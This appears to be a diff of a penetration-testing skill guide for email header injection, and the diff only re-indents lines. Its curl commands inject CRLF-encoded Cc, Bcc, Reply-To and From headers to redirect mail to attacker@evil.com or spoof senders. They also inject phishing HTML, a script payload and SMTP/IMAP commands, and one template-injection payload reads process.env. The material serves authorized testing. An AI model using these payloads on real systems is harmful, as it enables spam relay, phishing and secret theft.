@@ -1,10 +1,10 @@
 ---
 name: testing-for-email-header-injection
 description: Tests web application email functionality (contact forms, password reset,
-  newsletter subscriptions) for CRLF/SMTP header injection using Burp Suite and OWASP ZAP,
-  checking whether attackers can inject headers, modify recipients, or abuse forms for
-  spam relay. Use when testing any user-input-driven email-sending feature during a
-  penetration test.
+ newsletter subscriptions) for CRLF/SMTP header injection using Burp Suite and OWASP ZAP,
+ checking whether attackers can inject headers, modify recipients, or abuse forms for
+ spam relay. Use when testing any user-input-driven email-sending feature during a
+ penetration test.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -67,99 +67,99 @@ mitre_attack:
 
 # Test basic functionality first
 curl -X POST http://target.com/contact \
-  -d "name=Test&email=test@test.com&subject=Hello&message=Test message"
+ -d "name=Test&email=test@test.com&subject=Hello&message=Test message"
 ```
 
 ### Step 2 — Test for CRLF Header Injection
 ```bash
 # Inject additional email headers via CRLF in the email field
 curl -X POST http://target.com/contact \
-  -d "name=Test&email=test@test.com%0ACc:attacker@evil.com&message=Test"
+ -d "name=Test&email=test@test.com%0ACc:attacker@evil.com&message=Test"
 
 # Inject BCC header
 curl -X POST http://target.com/contact \
-  -d "name=Test&email=test@test.com%0ABcc:attacker@evil.com&message=Test"
+ -d "name=Test&email=test@test.com%0ABcc:attacker@evil.com&message=Test"
 
 # Inject via the name field
 curl -X POST http://target.com/contact \
-  -d "name=Test%0ACc:attacker@evil.com&email=test@test.com&message=Test"
+ -d "name=Test%0ACc:attacker@evil.com&email=test@test.com&message=Test"
 
 # Inject via subject field
 curl -X POST http://target.com/contact \
-  -d "name=Test&email=test@test.com&subject=Hello%0ABcc:attacker@evil.com&message=Test"
+ -d "name=Test&email=test@test.com&subject=Hello%0ABcc:attacker@evil.com&message=Test"
 
 # Try different CRLF encoding variants
 # %0D%0A (CRLF)
 curl -X POST http://target.com/contact \
-  -d "email=test@test.com%0D%0ACc:attacker@evil.com"
+ -d "email=test@test.com%0D%0ACc:attacker@evil.com"
 
 # %0A (LF only)
 curl -X POST http://target.com/contact \
-  -d "email=test@test.com%0ACc:attacker@evil.com"
+ -d "email=test@test.com%0ACc:attacker@evil.com"
 
 # %0D (CR only)
 curl -X POST http://target.com/contact \
-  -d "email=test@test.com%0DCc:attacker@evil.com"
+ -d "email=test@test.com%0DCc:attacker@evil.com"
 
 # Double encoding
 curl -X POST http://target.com/contact \
-  -d "email=test@test.com%250ACc:attacker@evil.com"
+ -d "email=test@test.com%250ACc:attacker@evil.com"
 ```
 
 ### Step 3 — Inject Custom Email Content
 ```bash
 # Override email body by injecting Content-Type and body
 curl -X POST http://target.com/contact \
-  -d "email=test@test.com%0AContent-Type:text/html%0A%0A<h1>Phishing</h1>"
+ -d "email=test@test.com%0AContent-Type:text/html%0A%0A<h1>Phishing</h1>"
 
 # Inject additional MIME parts
 curl -X POST http://target.com/contact \
-  -d "email=test@test.com%0AContent-Type:multipart/mixed;boundary=boundary123%0A--boundary123%0AContent-Type:text/html%0A%0A<script>alert(1)</script>"
+ -d "email=test@test.com%0AContent-Type:multipart/mixed;boundary=boundary123%0A--boundary123%0AContent-Type:text/html%0A%0A<script>alert(1)</script>"
 
 # Override From header for email spoofing
 curl -X POST http://target.com/contact \
-  -d "email=test@test.com%0AFrom:ceo@target.com"
+ -d "email=test@test.com%0AFrom:ceo@target.com"
 
 # Inject Reply-To for phishing
 curl -X POST http://target.com/contact \
-  -d "email=test@test.com%0AReply-To:attacker@evil.com"
+ -d "email=test@test.com%0AReply-To:attacker@evil.com"
 ```
 
 ### Step 4 — Test IMAP/SMTP Injection
 ```bash
 # IMAP command injection via email field
 curl -X POST http://target.com/webmail/search \
-  -d "query=test%0AEXAMINE INBOX"
+ -d "query=test%0AEXAMINE INBOX"
 
 # SMTP command injection
 curl -X POST http://target.com/api/send \
-  -d "to=test@test.com%0ARCPT TO:attacker@evil.com"
+ -d "to=test@test.com%0ARCPT TO:attacker@evil.com"
 
 # SMTP VRFY command injection
 curl -X POST http://target.com/api/verify \
-  -d "email=test@test.com%0AVRFY admin"
+ -d "email=test@test.com%0AVRFY admin"
 
 # Test SMTP relay abuse
 curl -X POST http://target.com/contact \
-  -d "email=test@test.com%0ATo:victim1@target.com%0ATo:victim2@target.com%0ATo:victim3@target.com"
+ -d "email=test@test.com%0ATo:victim1@target.com%0ATo:victim2@target.com%0ATo:victim3@target.com"
 ```
 
 ### Step 5 — Test JSON-Based Email APIs
 ```bash
 # JSON API header injection
 curl -X POST http://target.com/api/send-email \
-  -H "Content-Type: application/json" \
-  -d '{"to":"test@test.com\nCc:attacker@evil.com","subject":"Test","body":"Test"}'
+ -H "Content-Type: application/json" \
+ -d '{"to":"test@test.com\nCc:attacker@evil.com","subject":"Test","body":"Test"}'
 
 # Array injection for multiple recipients
 curl -X POST http://target.com/api/send-email \
-  -H "Content-Type: application/json" \
-  -d '{"to":["test@test.com","attacker@evil.com"],"subject":"Test","body":"Test"}'
+ -H "Content-Type: application/json" \
+ -d '{"to":["test@test.com","attacker@evil.com"],"subject":"Test","body":"Test"}'
 
 # Template injection in email body
 curl -X POST http://target.com/api/send-email \
-  -H "Content-Type: application/json" \
-  -d '{"to":"test@test.com","subject":"Test","body":"{{constructor.constructor(\"return process.env\")()}}"}'
+ -H "Content-Type: application/json" \
+ -d '{"to":"test@test.com","subject":"Test","body":"{{constructor.constructor(\"return process.env\")()}}"}'
 ```
 
 ### Step 6 — Validate Findings
